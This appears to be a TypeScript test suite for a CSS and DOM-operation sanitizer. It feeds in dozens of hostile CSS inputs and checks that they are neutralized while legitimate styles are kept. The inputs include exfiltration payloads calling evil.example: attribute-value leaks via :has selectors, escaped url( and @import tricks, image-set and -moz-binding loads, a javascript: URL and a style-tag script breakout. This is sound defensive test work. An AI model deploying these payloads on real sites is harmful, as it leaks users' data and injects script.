import { sanitizeCss, sanitizeOps } from '../src/shared/validate';

let fail = 0;
const check = (name: string, css: string, mustNotContain: RegExp[], mustContain: (RegExp | string)[] = []) => {
  const out = sanitizeCss(css);
  const bad = mustNotContain.filter((r) => r.test(out));
  const missing = mustContain.filter((r) => (typeof r === 'string' ? !out.includes(r) : !r.test(out)));
  if (bad.length || missing.length) {
    fail++;
    console.log('FAIL', name, '\n  in :', css, '\n  out:', out);
  } else console.log('ok  ', name);
};

const BS = '\\'; // a single backslash

// ---- must be neutralized
check('plain https leak', 'a{background:url(https://evil.example/x?a=1)}', [/evil/]);
check('attr leak via :has', 'body:has(input[value^="A"]){background-image:url("https://evil.example/A")}', [/evil/]);
check('escaped url(', `a{background:u${BS}72l(http://evil.example/p)}`, [/evil/]);
check('escaped url( hex+space', `a{background:${BS}75 rl("https://evil.example/p")}`, [/evil/]);
check('escaped @import', `@${BS}69mport "https://evil.example/x.css"; a{color:red}`, [/evil/, /@import/], [/color:red/]);
check('escaped @import 6-digit', `@${BS}000069mport url(https://evil.example/x.css);`, [/evil/]);
check('import non-google', '@import url(https://evil.example/x.css);', [/evil/]);
check('image-set bare string', 'a{background:image-set("https://evil.example/a.png" 1x)}', [/evil/]);
check('-webkit-image-set', 'a{background:-webkit-image-set(url(https://evil.example/a.png) 1x)}', [/evil/]);
check('cross-fade', 'a{background:cross-fade(url(https://evil.example/a.png),url(data:image/png;base64,AA),50%)}', [/evil/]);
check('src() bare', 'a{background:src("https://evil.example/a.png")}', [/evil/]);
check('unterminated url', 'a{background:url("https://evil.example/a.png}', [/evil/]);
check('comment-split', 'a{background:url(/**/https://evil.example/a)}', [/evil/]);
check('javascript:', 'a{background:url(javascript:alert(1))}', [/javascript/i]);
check('expression', 'a{width:expression(alert(1))}', [/expression\(/i]);
check('style breakout', 'a{}</style><script>alert(1)</script>', [/<\/?style/i]);

// Codex re-review: escaped hyphens / digits / underscores inside function names
check('image\\2d set bare string', `a{background:image${BS}2d set("https://evil.example/a" 1x)}`, [/evil/]);
check('-webkit-image\\-set', `a{background:-webkit-image${BS}-set("https://evil.example/a" 1x)}`, [/evil/]);
check('-webkit- escaped prefix', `a{background:${BS}2dwebkit${BS}2dimage-set("https://evil.example/a" 1x)}`, [/evil/]);
check('escaped i in image', `a{background:${BS}69mage-set("https://evil.example/a" 1x)}`, [/evil/]);
check('cross${BS}2dfade', `a{background:cross${BS}2dfade(url(https://evil.example/a),url(data:image/png;base64,AA),50%)}`, [/evil/]);
check('uppercase escaped', `a{background:IMAGE${BS}2DSET("https://evil.example/a" 1x)}`, [/evil/]);
check('escaped @import hyphen-free', `@${BS}49MPORT "https://evil.example/x.css";`, [/evil/]);
check('escaped src(', `a{background:${BS}73rc("https://evil.example/a")}`, [/evil/]);

// Round 3 (Codex): escaped backslash producing a second escape, custom properties, others
check('escaped backslash chain', 'a{background:u' + BS + '00005c00005c000072l(https://evil.example/leak)}', [/evil/]);
check('escaped backslash chain 2', 'a{background:u' + BS + '5c72l(https://evil.example/leak)}', [/evil/]);
check('custom property url', 'a{--x:url(https://evil.example/c);background:var(--x)}', [/evil/]);
check('custom property image-set', 'a{--x:image-set("https://evil.example/c" 1x);background:var(--x)}', [/evil/]);
check('custom property escaped', 'a{--x:u' + BS + '72l(https://evil.example/c);background:var(--x)}', [/evil/]);
check('attr typed url', 'a{content:attr(data-x url)}', [/data-x url/]);
check('-moz-binding', 'a{-moz-binding:url(https://evil.example/b.xml)}', [/evil/, /binding/]);
check('behavior', 'a{behavior:url(https://evil.example/b.htc)}', [/evil/]);
check('nested in @media', '@media (min-width:1px){a{background:url(https://evil.example/m)}}', [/evil/]);
check('nested in @supports', '@supports (display:grid){a{background:image-set("https://evil.example/m" 1x)}}', [/evil/]);
check('@keyframes url', '@keyframes k{from{background:url(https://evil.example/k)}}', [/evil/]);
check('@font-face evil src', '@font-face{font-family:X;src:url(https://evil.example/f.woff2)}', [/evil/]);
check('@namespace url', '@namespace url(https://evil.example/ns);', [/evil/]);
check('@charset/@page dropped', '@charset "x";@page{size:A4}a{color:red}', [/@charset/], ['color:red']);
check('unknown at-rule dropped', '@-moz-document url-prefix(){a{color:red}}', [/document/]);
check('uppercase URL(', 'a{background:URL(https://evil.example/u)}', [/evil/]);
check('url with spaces/comment', 'a{background:url( /* x */ https://evil.example/u )}', [/evil/]);
check('legit :has + attribute selector', 'input[value^="a"]:has(+ b){color:red}', [], ['color:red']);
check('legit var()', ':root{--c:#f0a}a{color:var(--c)}', [], ['var(--c)']);
check('legit calc/gradient/animation', '@keyframes k{from{opacity:0}to{opacity:1}}a{animation:k 1s;width:calc(100% - 4px);background:linear-gradient(red,blue)}', [], ['@keyframes k', 'calc(100% - 4px)', 'linear-gradient']);
check('legit @media', '@media (max-width:600px){a{color:red}}', [], ['@media', 'color:red']);

// ---- must survive
check(
  'google fonts import',
  '@import url("https://fonts.googleapis.com/css2?family=Lora:wght@400;700&display=swap");a{font-family:Lora}',
  [],
  ['fonts.googleapis.com', 'font-family:Lora'],
);
check('gstatic font face', '@font-face{font-family:X;src:url(https://fonts.gstatic.com/s/x.woff2)}', [], ['fonts.gstatic.com']);
check(
  'data uri svg quoted',
  `a{background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><rect/></svg>")}`,
  [],
  ['data:image/svg'],
);
check('data uri png unquoted', 'a{background:url(data:image/png;base64,iVBORw0KGgo=)}', [], ['data:image/png']);
check('tailwind-style escapes kept', `.md${BS}:flex{display:flex}.w-1${BS}/2{width:50%}`, [], [`.md${BS}:flex`, `.w-1${BS}/2`]);
check('content escape kept (as the character)', `a::before{content:"${BS}201C"}`, [], ['content:"“"']);
check('gradients & normal', 'body{background:linear-gradient(#fff,#eee);color:#333}', [], ['linear-gradient']);

import { sanitizeDeclarations } from '../src/shared/validate';
const inl = (name: string, css: string, bad: RegExp[], good: string[] = []) => {
  const out = sanitizeDeclarations(css);
  const f = bad.filter((r) => r.test(out)).length + good.filter((g) => !out.includes(g)).length;
  if (f) { fail++; console.log('FAIL inline', name, '->', out); } else console.log('ok   inline', name);
};
inl('inline url leak', 'color:red;background:url(https://evil.example/p)', [/evil/], ['color:red']);
inl('inline escaped', 'background:u' + BS + '72l(https://evil.example/p)', [/evil/]);
inl('inline ok', 'color:red;padding:4px', [], ['color:red', 'padding:4px']);
console.log('--- ops');
const ops = sanitizeOps([
  { op: 'insert', target: 'body', position: 'beforeend', tag: 'img', src: 'https://evil.example/leak?x=1' },
  { op: 'insert', target: 'body', position: 'beforeend', tag: 'img', src: 'data:image/png;base64,AAAA' },
  { op: 'insert', target: 'body', position: 'beforeend', tag: 'div', style: 'background:url(https://evil.example/p)' },
]);
console.log(JSON.stringify(ops.map((o: any) => ({ tag: o.tag, src: o.src?.slice(0, 20), style: o.style }))));
console.log(fail ? `${fail} FAILED` : 'ALL OK');
